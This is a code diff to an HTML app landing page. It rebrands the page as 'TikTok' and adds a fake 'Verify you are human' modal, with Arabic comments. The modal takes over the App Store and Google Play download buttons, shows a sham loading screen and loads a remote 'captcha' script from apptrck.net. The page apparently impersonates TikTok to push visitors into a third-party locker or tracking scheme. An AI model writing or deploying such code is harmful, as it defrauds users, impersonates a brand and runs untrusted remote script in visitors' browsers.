@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="color-scheme" content="dark">
-<title>AppName – Your profile, your banner, your vibe</title>
+<title>TikTok – Your profile, your banner, your vibe</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;800&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
@@ -136,7 +136,7 @@ h1 .v{background:linear-gradient(90deg,var(--a),var(--b));-webkit-background-cli
 <body>
 <div class="wrap">
 <nav>
- <a class="logo" href="#top"><i></i>AppName</a>
+<a class="logo" href="#top"><i></i>TikTok</a>
  <div class="links"><a href="#features">Features</a><a href="#install">How to install</a><a class="pill" href="#get">Get the app</a></div>
 </nav>
 
@@ -201,12 +201,106 @@ h1 .v{background:linear-gradient(90deg,var(--a),var(--b));-webkit-background-cli
  
 </div>
 
-<footer><span class="logo">AppName</span><div class="links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div><span>© 2026 AppName</span></footer>
+<footer><span class="logo">TikTok</span><div class="links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div><span>© 2026 TikTok</span></footer>
 </main>
 <script>
 (function(){var m=document.querySelector('.main .ban'),bs=document.querySelectorAll('.th button');
 bs.forEach(function(b){b.addEventListener('click',function(){m.style.background=b.dataset.bg;bs.forEach(function(x){x.style.boxShadow='none'});b.style.boxShadow='0 0 0 2px #fff'})});
 bs[3].style.boxShadow='0 0 0 2px #fff'})();
 </script>
+ <!-- ===== CAPTCHA MODAL (loading → captcha) ===== -->
+<style>
+@keyframes cp-spin{to{transform:rotate(360deg)}}
+#cpModal{position:fixed;inset:0;z-index:99999;background:rgba(5,5,7,.92);
+  -webkit-backdrop-filter:blur(6px);backdrop-filter:blur(6px);
+  display:flex;align-items:center;justify-content:center;padding:20px;
+  visibility:hidden;opacity:0;pointer-events:none;transition:opacity .25s}
+#cpModal.on{visibility:visible;opacity:1;pointer-events:auto}
+#cpBox{background:#101014;border:1px solid #2b2b33;border-radius:20px;
+  padding:28px 24px;max-width:420px;width:100%;text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.6);position:relative}
+#cpClose{position:absolute;top:10px;right:14px;background:none;border:0;
+  color:#9a9aa8;font-size:26px;line-height:1;cursor:pointer;padding:4px 8px}
+#cpClose:hover{color:#fff}
+#cpSpin{width:44px;height:44px;margin:8px auto 18px;
+  border:4px solid rgba(255,255,255,.15);border-top-color:#25f4ee;
+  border-radius:50%;animation:cp-spin 1s linear infinite}
+#cpLoader p{color:#9a9aa8;font-size:15px;margin:0}
+#cpContent{display:none}
+#cpContent p{color:#fff;font-weight:600;margin:0 0 14px}
+</style>
+
+<div id="cpModal" aria-hidden="true">
+  <div id="cpBox">
+    <button id="cpClose" type="button" aria-label="Close">×</button>
+    <div id="cpLoader">
+      <div id="cpSpin"></div>
+      <p>Loading… please wait</p>
+    </div>
+    <div id="cpContent">
+      <p>Verify you are human</p>
+      <!-- 👇 حاوية الكابتشا (يجب أن تبقى موجودة في الصفحة دائماً) -->
+      <div data-captcha-enable="true"></div>
+    </div>
+  </div>
+</div>
+
+<!-- سكربت الكابتشا (يجب أن يكون بعد الحاوية أعلاه) -->
+<script type="text/javascript" src="https://apptrck.net/cp/js/ymrzo"></script>
+
+<!-- منطق الفتح / زر Download -->
+<script>
+(function(){
+  var modal   = document.getElementById('cpModal');
+  var loader  = document.getElementById('cpLoader');
+  var content = document.getElementById('cpContent');
+  var closeBtn= document.getElementById('cpClose');
+  var timer   = null;
+
+  function openCaptcha(){
+    modal.classList.add('on');
+    modal.setAttribute('aria-hidden','false');
+    loader.style.display  = 'block';
+    content.style.display = 'none';
+    clearTimeout(timer);
+    // شاشة تحميل قصيرة (1.6 ثانية) ثم إظهار الكابتشا
+    timer = setTimeout(function(){
+      loader.style.display  = 'none';
+      content.style.display = 'block';
+    }, 1600);
+  }
+
+  function closeCaptcha(){
+    modal.classList.remove('on');
+    modal.setAttribute('aria-hidden','true');
+    clearTimeout(timer);
+  }
+
+  // 1) عند الضغط على App Store أو Google Play → شاشة تحميل ثم كابتشا
+  document.querySelectorAll('.stores .store').forEach(function(a){
+    a.addEventListener('click', function(e){
+      e.preventDefault();
+      openCaptcha();
+    });
+  });
+
+  // 2) زر "Download free" في الأسفل → يعيد المستخدم إلى أزرار المتاجر
+  var dl = document.querySelector('.cta .dl');
+  if (dl) {
+    dl.addEventListener('click', function(e){
+      e.preventDefault();
+      var stores = document.querySelector('.stores');
+      if (stores) stores.scrollIntoView({behavior:'smooth', block:'center'});
+    });
+  }
+
+  // إغلاق المودال
+  closeBtn.addEventListener('click', closeCaptcha);
+  modal.addEventListener('click', function(e){
+    if (e.target === modal) closeCaptcha();
+  });
+})();
+</script>
+<!-- ===== /CAPTCHA MODAL ===== -->
 </body>
 </html>
